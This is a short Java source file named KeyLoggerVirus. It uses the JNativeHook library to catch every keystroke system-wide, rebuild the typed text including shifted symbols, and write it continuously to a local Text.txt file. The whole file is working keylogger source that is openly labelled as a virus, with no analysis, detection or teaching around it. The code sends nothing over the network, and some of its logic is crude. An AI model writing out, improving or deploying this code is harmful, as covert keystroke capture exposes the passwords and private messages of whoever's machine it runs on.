package KeyLoggerVirus;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintWriter;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLoggerVirus implements NativeKeyListener {

	static String str = "";
	static boolean caps = false;
	static PrintWriter pw;
	
	public static void main(String[] args) throws FileNotFoundException {
		
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new KeyLoggerVirus());
		
		pw = new PrintWriter(new FileOutputStream(new File(KeyLoggerVirus.class.getResource("Text.txt").getFile())));
		
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		
		String s = NativeKeyEvent.getKeyText(e.getKeyCode());
		switch (s) {
		case "Space":
			str += " ";
			break;
		case "Backspace":
			str = str.substring(0, str.length() - 1);
			break;
		case "Delete":
			str = str.substring(0, str.length() - 1);
			break;
		case "Enter":
			str += "\n";
			break;
		case "Shift":
			caps = !caps;
			break;
		case "Caps Lock":
			caps = !caps;
			break;
		case "Back Quote":
			str += caps ? "~" : "`";
			break;
		case "Minus":
			str += caps ? "_" : "-";
			break;
		case "Equals":
			str += caps ? "+" : "=";
			break;
		case "Open Bracket":
			str += caps ? "{" : "[";
			break;
		case "Close Bracket":
			str += caps ? "}" : "]";
			break;
		case "Back Slash":
			str += caps ? "|" : "\\";
			break;
		case "Semicolon":
			str += caps ? ":" : ";";
			break;
		case "Quote":
			str += caps ? "\"" : "'";
			break;
		case "Comma":
			str += caps ? "<" : ",";
			break;
		case "Period":
			str += caps ? ">" : ".";
			break;
		case "Slash":
			str += caps ? "?" : "/";
			break;
		default:
			if (caps) {
				switch (s) {
				case "1":
					str += "!";
					break;
				case "2":
					str += "@";
					break;
				case "3":
					str += "#";
					break;
				case "4":
					str += "$";
					break;
				case "5":
					str += "%";
					break;
				case "6":
					str += "^";
					break;
				case "7":
					str += "&";
					break;
				case "8":
					str += "*";
					break;
				case "9":
					str += "(";
					break;
				case "0":
					str += ")";
					break;
				default:
					str += s;
					break;
				}
			}
			else
				str += s.toLowerCase();
			break;
		}
		pw.println(str);
		pw.flush();
//		System.out.println(str);
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		String s = NativeKeyEvent.getKeyText(e.getKeyCode());
		if (s == "Shift")
			caps = !caps;
//		str+="\nReleased: "+;
//		System.out.println(str);
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

}
